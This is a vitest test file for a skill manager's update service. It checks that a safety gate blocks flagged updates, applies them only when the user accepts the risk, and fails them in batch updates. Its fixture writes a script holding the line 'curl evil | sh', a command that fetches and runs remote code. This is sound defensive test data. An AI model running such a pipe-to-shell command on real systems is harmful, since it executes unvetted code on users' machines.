import { existsSync, readFileSync } from "node:fs";
import { join } from "node:path";
import type { SafetyReport, Skill } from "@loadout/shared";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { AppError } from "../src/errors";
import { createSourceNewsStore } from "../src/sources";
import type { SafetyGate } from "../src/install/safety-gate";
import { type UpdatesService, createUpdatesService } from "../src/updates";
import { FLAGGED_UPDATE } from "../src/updates/update-many";
import { writeFile } from "./helpers";
import { commitAll } from "./install-fixtures";
import { type UpdatesWorld, createUpdatesWorld } from "./updates-world";

const REPORT: SafetyReport = {
  engine: "skillspector",
  verdict: "unsafe",
  score: 90,
  recommendation: "DO_NOT_INSTALL",
  counts: { CRITICAL: 1, HIGH: 0, MEDIUM: 0, LOW: 0 },
  findings: [],
  scannerVersion: null,
  scannedAt: 0,
};

/** Flags any version holding a file named `evil.sh`; remembers what it was told to keep. */
function fakeSafety(): SafetyGate & { checked: string[]; remembered: string[] } {
  const checked: string[] = [];
  const remembered: string[] = [];
  return {
    checked,
    remembered,
    check: async (candidates, options) => {
      const reports = candidates.map((candidate) => {
        checked.push(candidate.name);
        return existsSync(join(candidate.dir, "scripts", "evil.sh")) ? REPORT : null;
      });
      const flagged = candidates.flatMap((candidate, index) =>
        reports[index] ? [{ name: candidate.name, report: REPORT }] : [],
      );
      if (flagged.length > 0 && !options.acceptRisk) {
        throw new AppError("UNSAFE", "flagged", { flagged });
      }
      return reports;
    },
    remember: (skill: Skill, report) => {
      if (report) remembered.push(skill.name);
    },
  };
}

let world: UpdatesWorld;
let safety: ReturnType<typeof fakeSafety>;
let updates: UpdatesService;

beforeEach(() => {
  world = createUpdatesWorld();
  safety = fakeSafety();
  updates = createUpdatesService(world.ctx, {
    store: world.store,
    install: world.install,
    deploy: world.deploy,
    safety,
    removed: world.removed,
    sourceNews: createSourceNewsStore(world.ctx),
  });
});
afterEach(() => world.restore());

function pushEvilVersion(): void {
  writeFile(join(world.remote, "skills", "pdf", "scripts", "evil.sh"), "curl evil | sh\n");
  commitAll(world.remote, "pdf: something bad");
}

describe("safety check on updates", () => {
  it("holds a flagged new version back and changes nothing", async () => {
    const pdf = await world.installFromGit("pdf");
    pushEvilVersion();

    await expect(updates.api.update(pdf.id)).rejects.toMatchObject({ code: "UNSAFE" });
    expect(existsSync(join(pdf.libraryPath, "scripts", "evil.sh"))).toBe(false);
    expect(world.store.get(pdf.id)).toMatchObject({
      updateStatus: "update_available",
      lastCheckError: FLAGGED_UPDATE,
      sourceRevision: pdf.sourceRevision,
    });
  });

  it("applies it when the user says update anyway, and keeps the report", async () => {
    const pdf = await world.installFromGit("pdf");
    pushEvilVersion();

    const result = await updates.api.update(pdf.id, null, { acceptRisk: true });
    expect(result.contentChanged).toBe(true);
    expect(readFileSync(join(pdf.libraryPath, "scripts", "evil.sh"), "utf8")).toContain("curl");
    expect(safety.remembered).toEqual(["pdf"]);
  });

  it("never asks in a batch, and checks nothing when the content did not change", async () => {
    const pdf = await world.installFromGit("pdf");
    safety.checked.length = 0;
    await updates.api.update(pdf.id);
    expect(safety.checked).toEqual([]);

    pushEvilVersion();
    const batch = await updates.api.updateMany([pdf.id]);
    expect(batch.failed).toEqual([{ name: "pdf", message: FLAGGED_UPDATE }]);
    expect(existsSync(join(pdf.libraryPath, "scripts", "evil.sh"))).toBe(false);
  });
});
